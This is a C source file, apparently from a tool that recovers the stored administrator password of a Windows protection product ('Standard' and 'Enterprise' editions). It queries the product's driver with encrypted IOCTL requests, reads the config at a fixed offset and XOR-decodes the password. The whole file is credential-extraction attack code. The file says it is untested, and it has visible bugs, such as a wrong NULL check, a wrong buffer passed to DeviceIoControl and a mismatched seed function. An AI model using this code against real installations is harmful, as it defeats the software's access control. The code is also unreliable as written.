/** None of this has been tested yet **/

#include <stdint.h>
#include <Windows.h>
#include "errors.h"
#include "ioctl.h"
#include "otp.h"
#include "shared.h"
#include "standard.h"

// Offset of the password in the config data
#define PASSWORD_OFFSET (0x3b6)

// Data that is encrypted then passed to the driver
// Sent with: CTRL_CONFIG_STANDARD, CTRL_CONFIG_ENTERPRISE_SIZE
uint8_t config_request_g[] = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xDC, 0xDE, 0x89, 0x67, 0x0C, 0x00, 0x00, 0x00
};

void STD_ReadPasswordHeader(password_header_t *header, const uint8_t *src)
{
	const uint16_t *src16 = (const uint16_t*)src;
	const uint32_t *src32 = (const uint32_t*)src;
	header->initial_seed = src32[0];
	header->remaining_size = src16[2];
	header->decoded_size = (header->remaining_size - 2) / 2;
}

uint16_t STD_GetNextIOControlSeed(uint16_t seed)
{
	return (((seed % 181) * 163) - ((seed / 181) * 2)) * -1;
}

void STD_Encrypt(uint8_t *dest, const uint8_t *src, size_t size)
{
	Encrypt(dest, src, size, OTP_GetNextIOControlSeed);
}

// Communicates with the driver and grabs the config data
// Expects the caller to free
// Relevant to: Standard v5.x - v7.x
int STD_RequestConfig(uint8_t **config)
{
	HANDLE hDrive;
	uint8_t config_request[16];
	uint32_t buffer_size, recv_count;
	*config = NULL;

	hDrive = OpenVolume();
	if (hDrive == INVALID_HANDLE_VALUE) {
		// fprintf(stderr, "Cannot open C: drive\n");
		return ERR_OPEN_VOLUME;
	}

	// Encrypt config data before sending to the driver
	STD_Encrypt(config_request, config_request_g, 16);
	if (!DeviceIoControl(hDrive, CTRL_CONFIG,
		config_request, 16,
		&buffer_size, 4,
		&recv_count, NULL)) {
		CloseHandle(hDrive);
		return ERR_IOCTL_GET_CONFIG_SIZE;
	}

	// Make sure the returned config size seems appropriate
	if (!IsGoodBufferSize(buffer_size)) {
		CloseHandle(hDrive);
		return ERR_IOCTL_BUFFER_SIZE;
	}

	// Allocate enough memory for the config data
	*config = (uint8_t*)malloc(sizeof(uint8_t) * buffer_size);
	if (config == NULL) {
		CloseHandle(hDrive);
		return ERR_MALLOC;
	}

	STD_Encrypt(config_request, config_request_g, 16);
	if (!DeviceIoControl(hDrive, CTRL_CONFIG,
		config_request, 16,
		config, buffer_size,
		&recv_count, NULL)) {
		free(*config);
		CloseHandle(hDrive);
		return ERR_IOCTL_GET_CONFIG;
	}

	CloseHandle(hDrive);
	return 0;
}

uint32_t STD_GetNextPasswordSeed(uint32_t seed)
{
	return (uint16_t)(32597 * (seed % 177) + 2 * (seed / 177));
}

void STD_DecodePassword(uint8_t *dest, const uint8_t *src, const password_header_t *header)
{
	uint32_t seed;
	uint16_t i, pass_length;

	seed = header->initial_seed;
	pass_length = header->decoded_size;

	for (i = 0; i < pass_length; i++) {
		seed = STD_GetNextPasswordSeed(seed);
		dest[i] = src[6 + (i * 2)] ^ (seed & 0xff);
	}
}

int STD_RequestPassword(uint8_t *dest, size_t size)
{
	int result;
	uint8_t *config;
	const uint8_t *password_data;
	password_header_t header;

	// Grab the config data
	if ((result = STD_RequestConfig(&config)) != 0)
		return result;

	// Go to where the password is
	password_data = config + PASSWORD_OFFSET;
	// Read the password header
	STD_ReadPasswordHeader(&header, password_data);

	if (size < (header.decoded_size + 1)) {
		free(config);
		return ERR_DEST_TOO_SMALL;
	}

	STD_DecodePassword(dest, (password_data + 6), &header);
	dest[header.decoded_size] = '\0'; // Set null-term
	free(config);

	return 0;
}
